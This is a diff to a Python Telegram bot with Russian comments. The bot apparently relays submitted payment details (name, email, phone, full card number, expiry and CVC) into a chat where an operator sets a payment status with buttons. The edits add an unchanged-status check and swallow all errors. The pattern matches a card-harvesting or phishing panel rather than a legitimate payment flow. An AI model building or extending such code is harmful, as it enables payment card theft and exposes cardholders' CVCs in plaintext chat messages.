@@ -400,6 +400,10 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
     # Берем оригинальное сообщение с данными карты
     original_text = callback.message.text
     
+    # Проверяем, не совпадает ли уже текущий статус
+    if status_text in original_text:
+        return success  # Просто выходим без уведомлений
+    
     # Разбираем сообщение чтобы сохранить данные карты
     lines = original_text.split('\n')
     card_data = []
@@ -408,18 +412,23 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
         if any(keyword in line for keyword in ['Имя:', 'Фамилия:', 'Email:', 'Телефон:', 'Номер:', 'Срок:', 'CVC:']):
             card_data.append(line)
     
-    # Собираем новое сообщение с данными карты и статусом (БЕЗ #123)
+    # Собираем новое сообщение с данными карты и статусом
     new_text = f"💳 <b>НОВАЯ ОПЛАТА</b>\n\n"
     new_text += "👤 <b>Данные карты:</b>\n"
     new_text += "\n".join(card_data) + "\n\n"
     new_text += f"{status_text}\n\n"
     new_text += "Выберите действие:"
     
-    await callback.message.edit_text(
-        new_text,
-        reply_markup=get_payment_buttons(payment_id, user_id),
-        parse_mode="HTML"
-    )
+    try:
+        await callback.message.edit_text(
+            new_text,
+            reply_markup=get_payment_buttons(payment_id, user_id),
+            parse_mode="HTML"
+        )
+    except Exception:
+        # Игнорируем ошибку "message not modified"
+        pass
+    
     return success
 
 # Обработчик для платежных данных
@@ -883,4 +892,5 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
